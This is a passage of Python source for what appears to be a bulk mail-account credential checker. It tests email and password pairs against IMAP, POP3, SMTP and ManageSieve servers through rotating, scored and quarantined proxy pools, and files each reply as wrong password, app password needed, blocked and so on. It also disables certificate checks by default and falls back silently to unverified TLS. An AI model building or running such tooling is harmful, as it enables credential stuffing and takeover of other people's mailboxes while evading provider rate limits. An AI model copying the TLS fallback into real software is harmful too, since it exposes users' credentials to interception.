        if hit and (now - hit[0]) < ttl:
            return hit[1]
    try:
        ip = socket.gethostbyname(h)
    except Exception:
        ip = None
    with _host_dns_lock:
        _DNS_CACHE[h] = (now, ip)
    return ip


def fast_fail_dns_check(host):
    return _resolve_cached(host) is not None


def _dedupe_hosts_by_ip(hosts, cap=3):
    out, seen_ips = [], set()
    for h in hosts:
        if not h or h in out:
            continue
        ip = _resolve_cached(h) or ("?" + h)
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        out.append(h)
        if len(out) >= cap:
            break
    if len(out) < cap:
        for h in hosts:
            if len(out) >= cap:
                break
            if h and h not in out:
                out.append(h)
    return out
# @@END 059 DNS_CACHE

# @@BLOCK 060 PROXY_CONNECT deps=022,023,059
def _raw_http_connect(host, port, info, timeout):
    """CONNECT through an HTTP proxy with a hand-built request.

    PySocks is a thin wrapper around exactly these bytes, but it only attaches
    Proxy-Authorization when BOTH the username and the password are truthy, and
    a build that drops the header silently is indistinguishable from a wrong
    password (407). Building the request here removes that dependency for the
    HTTP scheme - and it is the same exchange the Proxy Debug Console performs.

    The status line is classified HERE, not left to a string match further up, so
    a 402 can never be mistaken for a 407.

    v13.51 - THE SWALLOWED GREETING.  This used to recv() in 2048-byte chunks and
    stop at the first CRLF, then return the socket.  Everything the chunk had
    already swallowed past that CRLF - the rest of the proxy's headers AND the
    first bytes of the tunnel - was dropped on the floor.  imaplib, poplib and
    smtplib all read through sock.makefile(), a buffer on the RAW socket, so the
    discarded bytes could not be recovered by any wrapper: they were simply gone.
    IMAP, POP3 and SMTP all send a greeting immediately, so a healthy host
    returned "The read operation timed out" whenever the greeting shared a
    segment with the CONNECT reply.  Reading ONE BYTE AT A TIME and stopping
    exactly on the header terminator leaves the remainder in the kernel buffer,
    where makefile() finds it.
    """
    sk = socket.create_connection((info["host"], int(info["port"])), timeout=timeout)
    try:
        sk.settimeout(timeout)
        tok = base64.b64encode(
            f"{info.get('user') or ''}:{info.get('pass') or ''}".encode()).decode()
        req = (f"CONNECT {host}:{port} HTTP/1.1\r\n"
               f"Host: {host}:{port}\r\n"
               f"Proxy-Connection: keep-alive\r\n"
               f"Proxy-Authorization: Basic {tok}\r\n\r\n")
        sk.sendall(req.encode())
        buf = b""
        while not buf.endswith(b"\r\n\r\n") and len(buf) < 8192:
            ch = sk.recv(1)
            if not ch:
                break
            buf += ch
        line = buf.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        parts = line.split()
        code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
        if code == 200:
            return sk
        try:
            sk.close()
        except Exception:
            pass
        if code == 407:
            raise ProxyAuthError(f"proxy rejected the credential (raw CONNECT 407): {line}")
        if code in (402, 429, 503):
            raise ProxyPlanError(f"provider refusing service (raw CONNECT {code}): {line[:140]}")
        if code == 403:
            raise ProxyPortBlocked(f"proxy refused the destination (raw CONNECT 403): {line}")
        raise ProxyTransportError(
            f"proxy answered {code or 'nothing'} to CONNECT: {line[:140]}")
    except (ProxyAuthError, ProxyPlanError, ProxyPortBlocked, ProxyTransportError):
        raise
    except Exception:
        try:
            sk.close()
        except Exception:
            pass
        raise


def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
    """Open a tunnel.  This is ALWAYS a proxy hop.

    v13.51 - THE FLOORS WERE CEILINGS.  CONNECT_FLOOR_DEFAULT (10s) and
    READ_FLOOR_DEFAULT (15s) were applied with max(), so a rung the sweep had
    budgeted at ~3.7s still blocked for 10s on the connect and 15s on the read -
    25s for a 3.7s rung.  A 33s phase window therefore died after ONE rung and
    the ladder (sibling hosts, POP3, 143/110, the whole direct sweep) never ran.
    Both are now capped by the caller's budget, with a small hard minimum.
    """
    base_timeout = timeout or live_cfg()["PROXY_CONNECT_TIMEOUT"]
    try:
        with proxy_lock:
            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
    except Exception:
        fails = 0
    effective_timeout = max(3.0, base_timeout - (fails * 0.1))
    leg_to = max(2.5, min(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6))
    read_to = max(3.0, min(READ_FLOOR_DEFAULT, effective_timeout * 0.9))

    if not proxy_str or proxy_str == "direct":
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection(
            (host, port), timeout=max(2.5, min(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6)))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.settimeout(read_to)
        return s

    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK:
        raise RuntimeError("bad proxy format or socks unavailable")

    last_err = None
    auth_schemes = set()
    port_blocked = False
    plan_blocked = False
    for ptype in _scheme_order(proxy_str):
        try:
            # HTTP is dialled by hand - the auth header is ours, not PySocks'.
            if ptype == socks.HTTP:
                s = _raw_http_connect(host, port, info, leg_to)
            else:
                kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                      "proxy_port": info["port"], "proxy_rdns": remote_dns}
                if info["user"]:
                    kw["proxy_username"] = info["user"]
                    kw["proxy_password"] = info["pass"]
                s = socks.create_connection((host, port), timeout=leg_to, **kw)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(read_to)
            _remember_scheme(proxy_str, ptype)
            return s
        except Exception as proxy_ex:
            last_err = proxy_ex
            if _is_proxy_plan_error(str(proxy_ex)):
                # A 402 is provider-wide; SOCKS5 on an HTTP-only port answers
                # "authentication failed" and would bury it under a fake 407.
                plan_blocked = True
                break
            if _is_proxy_auth_fail(str(proxy_ex)):
                auth_schemes.add(ptype)
            elif _is_proxy_port_block(str(proxy_ex)):
                # 403: the provider refuses this DESTINATION PORT by policy. The
                # credential is proven good and the node is alive, so this is its
                # own exception - rotating the proxy would burn a node for
                # something no other node can fix either.
                port_blocked = True

    if plan_blocked:
        raise ProxyPlanError(f"provider refusing service for {host}:{port}: {last_err}")

    if auth_schemes:
        raise ProxyAuthError(f"Proxy authentication required for {host}:{port}: {last_err}")

    if port_blocked:
        raise ProxyPortBlocked(
            f"proxy refused destination port {port} for {host} (403 - blocked port, "
            f"credential accepted): {last_err}")

    raise ProxyTransportError(f"Proxy tunnel transport failure for {host}:{port}: {last_err}")
# @@END 060 PROXY_CONNECT

# @@BLOCK 061 TLS_LAYER deps=023,059,060
def _tls_context(host: str, verify: bool):
    if verify:
        ctx = ssl.create_default_context()
    else:
        ctx = ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
    except Exception:
        pass
    return ctx


def _raw_socket(host, port, proxy_str=None, timeout=None):
    """v13.51: the read/connect floors are CAPS now, not minimums.

    READ_FLOOR_DEFAULT (15s) with max() meant a 3s rung blocked 15s on a read,
    so a 33s phase window was spent by two rungs and the loop reported
    "window reached; N rung(s) not attempted" on every account. max() is now
    min() against the caller's budget, with a 3s / 2.5s hard minimum.
    """
    t = timeout or live_cfg()["TIMEOUT"]
    read_to = max(3.0, min(READ_FLOOR_DEFAULT, t * 0.9))
    if proxy_str and proxy_str != "direct":
        s = proxy_connect(host, port, proxy_str, timeout=t)
    else:
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection(
            (host, port), timeout=max(2.5, min(CONNECT_FLOOR_DEFAULT, t * 0.6)))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(read_to)
    return s


def tls_connect(host, port, proxy_str=None, insecure=None, timeout=None):
    """ALLOW_SELF_SIGNED is a REAL switch, and TLS_STRICT is read.

    insecure=None means "read ALLOW_SELF_SIGNED from CFG", so every caller -
    including the Mailbox Reader - honours the checkbox.
    """
    if insecure is None:
        insecure = bool(live_cfg().get("ALLOW_SELF_SIGNED", True))
    if insecure:
        return _tls_context(host, False).wrap_socket(
            _raw_socket(host, port, proxy_str, timeout), server_hostname=host)

    raw = _raw_socket(host, port, proxy_str, timeout)
    try:
        return _tls_context(host, True).wrap_socket(raw, server_hostname=host)
    except ssl.SSLError as e:
        if live_cfg().get("TLS_STRICT", False):
            warnings.warn(f"Verified TLS failed for {host} ({e!r}); "
                          f"TLS_STRICT is ON so NOT falling back")
            raise
        warnings.warn(f"Verified TLS failed for {host} ({e!r}); "
                      f"retrying unverified on a FRESH socket")
        return _tls_context(host, False).wrap_socket(
            _raw_socket(host, port, proxy_str, timeout), server_hostname=host)
# @@END 061 TLS_LAYER

# @@BLOCK 062 PX_TAG deps=052
def px_tag(proxy_str):
    """The proxy label stamped on every trace line.

    v13.70 ISO-14: proxy_meta is a per-user table and this runs on worker
    threads for every attempt, so a rerun in another tab labelled one user's
    nodes with the other user's country and region. proxy_is_quarantined() below
    it already rebound; this did not.
    """
    if not proxy_str or proxy_str == "direct":
        g = direct_geo()
        return f"direct | {g['ip']} | {g['region']} | {g['country']} | {g['vpn']}"
    _rebind_scope()
    info = parse_proxy(proxy_str)
    if not info:
        return "proxy"
    meta = proxy_meta.get(proxy_str, {})
    q = " [QUARANTINED]" if proxy_is_quarantined(proxy_str) else ""
    who = f"{info.get('user')}@" if info.get("user") else ""
    return f"{who}{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}{q}"
# @@END 062 PX_TAG

# @@BLOCK 063 PROTOCOL_CLIENTS deps=061
class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=None):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str,
                           insecure=self._insecure, timeout=timeout)


class ProxyIMAP4(imaplib.IMAP4):
    def __init__(self, host, port=143, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)


class ProxyPOP3SSL(poplib.POP3_SSL):
    def __init__(self, host, port=995, timeout=None, proxy_str=None, insecure=None):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str,
                           insecure=self._insecure, timeout=timeout)


class ProxyPOP3(poplib.POP3):
    def __init__(self, host, port=110, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)


def pop3_ok(resp):
    if resp is None:
        return False
    if isinstance(resp, (bytes, bytearray)):
        return bytes(resp).lstrip().startswith(b"+")
    if isinstance(resp, str):
        return resp.lstrip().startswith("+")
    if isinstance(resp, (tuple, list)):
        return len(resp) >= 1
    return True
# @@END 063 PROTOCOL_CLIENTS

# @@BLOCK 064 IMAP_SASL deps=063
def _imap_caps(mail) -> set:
    """UPPERCASE capability tokens as a set of str.  Never raises.  Cached."""
    cached = getattr(mail, "_venice_caps", None)
    if cached is not None:
        return cached
    out = set()
    try:
        raw = getattr(mail, "capabilities", None)
        if raw is None:
            raw = ()
        if isinstance(raw, (str, bytes, bytearray)):
            raw = (raw,)
        for c in raw:
            if c is None:
                continue
            if isinstance(c, bytes):
                out.update(c.decode("ascii", "ignore").upper().split())
            elif isinstance(c, bytearray):
                out.update(bytes(c).decode("ascii", "ignore").upper().split())
            else:
                out.update(str(c).upper().split())
        if not out:
            try:
                typ, dat = mail.capability()
                if typ == "OK":
                    for c in (dat or []):
                        if c is None:
                            continue
                        if isinstance(c, (bytes, bytearray)):
                            out.update(bytes(c).decode("ascii", "ignore").upper().split())
                        else:
                            out.update(str(c).upper().split())
            except Exception:
                pass
    except Exception:
        out = set()
    try:
        mail._venice_caps = out
    except Exception:
        pass
    return out


def _imap_wants_plain(mail) -> bool:
    """True when the server will not accept the LOGIN command."""
    caps = _imap_caps(mail)
    if not caps:
        return False
    if "LOGINDISABLED" in caps:
        return True
    if "AUTH=PLAIN" in caps and "AUTH=LOGIN" not in caps:
        return True
    return False


def _imap_authenticate_plain(mail, user, password):
    """SASL PLAIN via AUTHENTICATE.  imaplib base64-encodes whatever we return,
    so the payload must be RAW."""
    raw = ("\0" + user + "\0" + password).encode("utf-8")
    mail.authenticate("PLAIN", lambda _challenge: raw)


def _imap_auth(mail, user, password):
    """LOGIN, or AUTHENTICATE PLAIN when the server disables LOGIN."""
    user = (user or "").strip()
    password = (password or "").strip()

    if _imap_wants_plain(mail):
        try:
            _imap_authenticate_plain(mail, user, password)
            return
        except imaplib.IMAP4.abort:
            raise
        except imaplib.IMAP4.error as e:
            msg = str(e).lower()
            if any(k in msg for k in ("authenticationfailed", "invalid credentials",
                                      "authentication failed", "login failed",
                                      "auth failed", "bad credentials")):
                raise
            try:
                mail.state = "NONAUTH"
            except Exception:
                pass

    typ, data = mail.login(user, password)
    if typ != "OK":
        raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
# @@END 064 IMAP_SASL

# @@BLOCK 065 SMTP_AUTH deps=023,061
_HELO_STATE = STATE["helo_name"]


def smtp_helo_name() -> str:
    now = time.time()
    if _HELO_STATE.get("name") and now - _HELO_STATE.get("ts", 0.0) < 3600:
        return _HELO_STATE["name"]
    with STATE["helo_lock"]:
        if _HELO_STATE.get("name") and time.time() - _HELO_STATE.get("ts", 0.0) < 3600:
            return _HELO_STATE["name"]
        name = ""
        try:
            name = socket.getfqdn() or ""
        except Exception:
            name = ""
        if "." not in name:
            ip = public_ip()
            if ip and ip != "Unknown":
                name = f"[{ip}]"
        if not name:
            name = "localhost"
        _HELO_STATE.update(name=name, ts=time.time())
        return name


def _smtp_read_reply(sock, limit=24) -> str:
    lines = []
    for _ in range(limit):
        buf = b""
        while not buf.endswith(b"\n"):
            try:
                chunk = sock.recv(1)
            except Exception:
                chunk = b""
            if not chunk:
                break
            buf += chunk
        if not buf:
            break
        text = buf.decode("utf-8", errors="ignore").rstrip("\r\n")
        lines.append(text)
        if len(text) >= 4 and text[3] == "-":
            continue
        break
    return "\n".join(lines)


def _smtp_cmd(sock, cmd, quiet=False) -> str:
    try:
        sock.sendall((cmd + "\r\n").encode())
    except Exception:
        if not quiet:
            raise
        return ""
    try:
        return _smtp_read_reply(sock)
    except Exception:
        if quiet:
            return ""
        raise


def smtp_auth_once(email, password, server, proxy_str=None, insecure=None, port=587,
                   attempt_timeout=None, user=None):
    """Confirm-only SMTP submission AUTH.  Raises SmtpAuthError ONLY on a clean 535."""
    if insecure is None:
        insecure = bool(live_cfg().get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or live_cfg()["TIMEOUT"]
    s = None
    try:
        s = _raw_socket(server, port, proxy_str, timeout=to)
        if int(port) == 465:
            s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
        s.settimeout(max(READ_FLOOR_MIN, float(to)))

        banner = _smtp_read_reply(s)
        if not banner.startswith("220"):
            raise SmtpSoftError(f"banner not 220: {banner[:60]!r}")

        ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
        caps = ehlo.upper()
        if "STARTTLS" in caps and int(port) != 465:
            r = _smtp_cmd(s, "STARTTLS")
            if r.startswith("220"):
                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
                s.settimeout(max(READ_FLOOR_MIN, float(to)))
                ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
                caps = ehlo.upper()
        if "AUTH" not in caps:
            raise SmtpSoftError("server does not advertise AUTH")

        who = (user or email).strip()
        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()

        r = _smtp_cmd(s, f"AUTH PLAIN {payload}")
        if r.startswith("334"):
            r = _smtp_cmd(s, payload)

        low = r.lower()
        if r.startswith("504") or "unrecognized" in low or "not supported" in low:
            r2 = _smtp_cmd(s, "AUTH LOGIN")
            if r2.startswith("334"):
                _smtp_cmd(s, base64.b64encode(who.encode()).decode())
                r = _smtp_cmd(s, base64.b64encode(password.encode()).decode())
            else:
                r = r2
            low = r.lower()

        if r.startswith("235"):
            return True
        if (r.startswith("535") or "authentication failed" in low
                or "invalid credentials" in low
                or "username and password not accepted" in low):
            raise SmtpAuthError(f"SMTP AUTH rejected: {r[:90]}")
        raise SmtpSoftError(f"SMTP AUTH inconclusive: {r[:90]}")
    finally:
        if s is not None:
            try:
                _smtp_cmd(s, "QUIT", quiet=True)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
# @@END 065 SMTP_AUTH

# @@BLOCK 066 SIEVE_AUTH deps=011,023,061
def sieve_auth_once(email, password, server, proxy_str=None, insecure=None,
                    port=SIEVE_PORT, attempt_timeout=None, user=None):
    """Confirm-only ManageSieve (RFC 5804) AUTH.  Same credentials, port 4190."""
    if insecure is None:
        insecure = bool(live_cfg().get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or live_cfg()["TIMEOUT"]
    s = None
    try:
        s = _raw_socket(server, port, proxy_str, timeout=to)
        s.settimeout(max(READ_FLOOR_MIN, float(to)))
        greet = s.recv(600).decode("utf-8", errors="ignore")
        if not greet:
            raise SieveSoftError("no ManageSieve greeting")
        up = greet.upper()
        if "SIEVE" not in up and "IMPLEMENTATION" not in up:
            raise SieveSoftError(f"not a ManageSieve greeting: {greet[:60]!r}")
        if "STARTTLS" in up:
            s.sendall(b"STARTTLS\r\n")
            r = s.recv(300).decode("utf-8", errors="ignore")
            if r.startswith("OK"):
                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
                s.settimeout(max(READ_FLOOR_MIN, float(to)))
                s.recv(600)
        who = (user or email).strip()
        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()
        s.sendall(f'AUTHENTICATE "PLAIN" "{payload}"\r\n'.encode())
        r = s.recv(600).decode("utf-8", errors="ignore")
        up = r.upper()
        if up.startswith("OK"):
            return True
        if (up.startswith("NO") or "AUTHENTICATIONFAILED" in up
                or "INVALID" in up or "AUTHENTICATION FAILED" in up):
            raise SieveAuthError(f"ManageSieve AUTH rejected: {r[:90]}")
        raise SieveSoftError(f"ManageSieve inconclusive: {r[:90]}")
    finally:
        if s is not None:
            try:
                s.sendall(b"LOGOUT\r\n")
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
# @@END 066 SIEVE_AUTH

# @@BLOCK 067 ERROR_CLASSIFY deps=016,017,022,023,039
# status.py emits the SPECIFIC tokens (WRONG_PASSWORD, NEED_APP_PASSWORD,
# RBL_BLOCKED, RETRY_LATER) while every ladder in this file compares the
# COLLAPSED names (WRONG, APP, RBL, RETRY).  note_verdict()'s whitelist holds
# only the collapsed names, so an AUTHENTICATIONFAILED was filed as Connection
# Failed and silently dropped.  Fold once, at the boundary.
# DNS_FAILED / SMTP_FAILED are already SPECIFIC, are reported as their own
# buckets (dns_results / smtp_results) and arm the Fast-Mode cooldown, so they
# map to THEMSELVES - flattening them onto CONNECTION_FAILED made a DNS problem
# indistinguishable from a refused socket.
_CANON_STATUS = {
    WRONG_PASSWORD: WRONG,
    NEED_APP_PASSWORD: APP,
    RBL_BLOCKED: RBL,
    RETRY_LATER: RETRY,
    FAILED: CONNECTION_FAILED,
    DNS_FAILED: DNS_FAILED,
    SMTP_FAILED: SMTP_FAILED,
}

# v13.60: THE POP3 TWINS.
#
# Gmail's POP3 daemon answers the same two facts its IMAP daemon does, in
# slightly different words, and status.py owns only the IMAP wording:
#
#   IMAP  "Invalid credentials (Failure)"            -> WRONG
#   POP3  "[AUTH] Username and password not accepted" -> UNKNOWN
#
#   IMAP  "IMAP access is disabled"                  -> APP
#   POP3  "Please enable POP3 access in your account
#          settings first"                            -> UNKNOWN
#
# The same evidence therefore landed in two different buckets depending only on
# which protocol happened to answer, and a POP3-rejected password sat in the
# Unclassified pile. These two tables are answered BEFORE the delegate, so the
# result is identical to the IMAP path and does not depend on status.py being
# current. WRONG is tested first: Gmail's disabled-POP text does not contain the
# credential phrase, but ordering it this way keeps a wrong password out of the
# app-password bucket even if the two ever overlap.
_POP_STRONG_WRONG = (
    "username and password not accepted",
    "invalid credentials (failure)",
    "invalid credentials (no auth)",
)
_POP_APP = (
    "please enable pop3 access",
    "enable pop3 access in your account settings",
    "pop3 access is disabled",
    "pop access is disabled",
    "enable pop3",
    "enable pop",
)


def classify_error(err, domain=""):
    try:
        err_str = str(err)
        if domain in ZERO_ACCESS_PROVIDERS:
            return APP
        _low = err_str.lower()
        if any(t in _low for t in _POP_STRONG_WRONG):
            return WRONG
        if any(t in _low for t in _POP_APP):
            return APP
        st_val = st_classify(err_str, domain)
        return _CANON_STATUS.get(st_val, st_val)
    except Exception:
        return UNKNOWN


def _is_proxy_level_error(msg):
    """True when the failure is a PROXY CREDENTIAL rejection - not a tunnel reset.

    FIX PX-1: status.is_proxy_level_error() runs normalise() on its argument, so
    it only answers for a TOKEN ("PROXY_UNHEALTHY"). Every caller here passes RAW
    error TEXT, for which normalise() yields UNKNOWN - the answer was therefore
    always False and a 407 arriving as a generic exception never set saw_407,
    never recorded an is_proxy_auth strike and never armed the quarantine. The
    inline fallback in block 004 does substring matching and was right all along.
    This now does the same thing first, and only falls back to the token test.
    """
    s = (msg or "").lower()
    if not s:
        return False
    if _is_proxy_auth_fail(s):
        return True
    if "proxy auth" in s or "proxyconnect" in s:
        return True
    try:
        return st_proxy_level(s) is True
    except Exception:
        return False


def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_auth=False,
                         is_plan=False):
    # v13.64: SCOPE. This is called from worker threads in the middle of an
    # account, long after anything re-asserted a scope, so a rerun in another tab
    # could point every write below at the other user's tables.
    _rebind_scope()
    try:
        if not proxy_str:
            return
        if is_proxy_auth and live_cfg().get("QUARANTINE_407", True):
            with proxy_lock:
                ever_ok = int((proxy_meta.get(proxy_str) or {}).get("success", 0))
            # FIX 407-SCOPE: a node that has DELIVERED before is parked, never
            # struck. A 407 from a working node is far more likely the destination,
            # the sub-user cap or the plan than the node, and striking it three
            # times quarantined a pool that was never broken. Only a node that has
            # never delivered collects strikes.
            if ever_ok:
                _park_proxy_407(proxy_str)
            elif not proxy_is_quarantined(proxy_str):
                with proxy_quarantine_lock:
                    _proxy_407[proxy_str] += 1
                    strikes = _proxy_407[proxy_str]
                if strikes >= PROXY_407_QUARANTINE:
                    quarantine_proxy(proxy_str, f"{strikes}x 407")
                else:
                    _park_proxy_407(proxy_str)
        elif is_plan:
            # FIX PLAN-1: a 402 is the provider's bandwidth/plan, not the node.
            # Park it so rotation prefers something usable, but never strike it.
            # v13.64: parked for the PLAN horizon - a spent plan does not recover
            # in ninety seconds.
            _park_proxy(proxy_str, PROXY_PLAN_PARK)
        threshold = int(live_cfg().get("BLACKLIST_CF", BLACKLIST_CF_DEFAULT))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "plan": 0,
                                         "country": "Unknown",
                                         "region": "Unknown", "latency_ms": 0}
            m = proxy_meta[proxy_str]
            if success:
                m["success"] = m.get("success", 0) + 1
                m["plan"] = 0
                consecutive_proxy_failures[proxy_str] = 0
            else:
                # FIX PLAN-1: a 402 and a 407 are both PROVIDER answers, not node
                # failures. They used to add a fail each, and five fails is a
                # score of zero - which is how ten working proxies ended up below
                # the Min Proxy Score filter while eleven dead lines survived.
                if not is_plan and not is_proxy_auth:
                    m["fails"] = m.get("fails", 0) + 1
                if is_plan:
                    m["plan"] = m.get("plan", 0) + 1
                if is_network_error and not is_proxy_auth and not is_plan:
                    consecutive_proxy_failures[proxy_str] += 1
                    if consecutive_proxy_failures[proxy_str] >= threshold:
                        circuit_breaker_until[proxy_str] = time.time() + CIRCUIT_BREAKER_SECONDS
                        consecutive_proxy_failures[proxy_str] = 0
            # v13.64: THE SCORE WAS INVERTED. compute_real_score(0, 0) answers the
            # 80 default and compute_real_score(1, 0) answers 75, so a node that had
            # never opened a tunnel outranked one that had just proved it worked -
            # on a live pool the 100 spent nodes sat ABOVE the 80 working ones, and
            # the "a node that ever passed is never dropped by score" rescue in
            # block 058 could not help because the spent nodes never fell below the
            # filter in the first place. Each unanswered 402 costs 6, which puts a
            # plan-only node strictly below a proven one without failing it.
            _base = compute_real_score(m.get("success", 0), m.get("fails", 0))
            m["score"] = max(0, int(_base) - min(60, 6 * int(m.get("plan", 0))))
    except Exception as e:
        warnings.warn(f"Error recording proxy attempt: {e}")
# @@END 067 ERROR_CLASSIFY

# @@BLOCK 068 SMTP_PRECHECK deps=043,059,061,065
def _smtp_banner_ok(hosts, px, timeout=3.5):
    for h in hosts:
        for port, use_tls in ((587, False), (465, True), (25, False)):
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=timeout)
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(timeout)
                banner = s.recv(200)
                if banner[:3] == b"220":
                    return True
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    return False


def smtp_domain_probe(domain, timeout=3.5):
    try:
        hosts = host_smtp_candidates(domain) or []
    except Exception:
        hosts = []
    if not hosts:
        return None

    live = [h for h in hosts[:2] if fast_fail_dns_check(h)]
    if not live:
        return False

    if _smtp_banner_ok(live, None, timeout):
        return True

    with alive_pool_lock:
        have_pool = bool(alive_pool)
    if have_pool and live_cfg().get("PROXY_MODE", "fallback") != "off":
        if _smtp_banner_ok(live, sample_alive_proxy(domain=domain), timeout):
            return True
    return False


def smtp_cached(domain):
    with _SMTP_LOCK:
        hit = _SMTP_DOMAIN_CACHE.get(domain)
    return bool(hit and (time.time() - hit[0]) < _SMTP_CACHE_TTL)


def smtp_precheck_domains(domains, max_workers=None, budget=None):
    max_workers = max_workers or _SMTP_PRECHECK_WORKERS
    budget = budget or _SMTP_PRECHECK_BUDGET

    results = {}
    doms = [d for d in dict.fromkeys(d for d in (domains or []) if d)]
    if not doms:
        return results

    now = time.time()
    todo = []
    with _SMTP_LOCK:
        for d in doms:
            hit = _SMTP_DOMAIN_CACHE.get(d)
            if hit and (now - hit[0]) < _SMTP_CACHE_TTL:
                results[d] = hit[1]
            else:
                todo.append(d)

    if not todo:
        return results

    deadline = time.time() + budget
    try:
        with ThreadPoolExecutor(max_workers=min(max_workers, len(todo))) as ex:
            futs = {ex.submit(smtp_domain_probe, d): d for d in todo}
            for fut in as_completed(futs, timeout=max(1.0, deadline - time.time())):
                d = futs[fut]
                try:
                    res = fut.result()
                except Exception:
                    res = None
                results[d] = res
                with _SMTP_LOCK:
                    _SMTP_DOMAIN_CACHE[d] = (time.time(), res)
    except Exception as e:
        log_startup(f"WARNING: SMTP pre-check batch timeout/error: {e}", quiet=True)

    for d in todo:
        results.setdefault(d, None)
    return results


def smtp_failed_check(domain, px, trace_logs):
    try:
        hosts = host_smtp_candidates(domain)
    except Exception:
        hosts = []
    if not hosts:
        trace_logs.append("SMTP failed check: no SMTP candidate hosts discovered")
        return None
    attempted = 0
    for h in hosts[:2]:
        if not fast_fail_dns_check(h):
            trace_logs.append(f"SMTP failed check: {h} does not resolve locally")
            continue
        for port, use_tls in ((587, False), (465, True), (25, False)):
            attempted += 1
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(
                    live_cfg().get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(min(6.0, max(3.0, float(live_cfg().get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                banner = s.recv(200)
                if banner[:3] == b"220":
                    trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port} OK")
                    return True
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: "
                                  f"unexpected banner {banner[:40]!r}")
            except Exception as e:
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: {str(e)[:90]}")
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    if attempted:
        trace_logs.append("SMTP failed check -> all SMTP candidates failed")
        return False
    trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
    return None


def _smtp_hosts_for(domain, cap=SMTP_HOST_CAP):
    """First SMTP submission host, preferring an explicit smtp.<domain>."""
    try:
        hosts = [h for h in (host_smtp_candidates(domain) or []) if h]
    except Exception:
        hosts = []
    if not hosts:
        return []
    if not hosts[0].lower().startswith("smtp"):
        for i, h in enumerate(hosts):
            if h.lower().startswith("smtp"):
                hosts.insert(0, hosts.pop(i))
                break
    return hosts[:cap]
# @@END 068 SMTP_PRECHECK

# @@BLOCK 069 POOL_SAMPLE deps=052
def _pool_tiers(pool):
    """Split a pool into (passed, plan-refused, everything else).

    Derived from probe_stats, which is THIS user's own table, so a refresh, a
    re-probe or another user's rerun cannot scramble the ranking.
    """
    try:
        with probe_stats_lock:
            snap = dict(probe_stats)
    except Exception:
        snap = {}
    a, b, c = [], [], []
    for p in pool:
        r = (snap.get(p) or {}).get("reason") or ""
        if r == "ok":
            a.append(p)
        elif r == "plan":
            b.append(p)
        else:
            c.append(p)
    return a, b, c


def sample_alive_proxy(exclude=None, domain=None, avoid=None):
    """RANDOM ROTATION, an account avoid-set, and a QUALITY TIER.

    v13.64: THE POOL WAS FLAT. A node whose last probe answered 402 Payment
    Required was handed to the checker exactly like a node that had just opened a
    real tunnel - 100 of 180 nodes in a real pool - so roughly 55% of every
    account's attempts were spent on a node the provider was refusing service on.
    The pool is three tiers now and a tier is only used when every tier above it
    is empty:

        A  the node's LAST probe PASSED          (it has just worked)
        B  the node's last probe was 402 / plan  (alive, authenticates, no service)
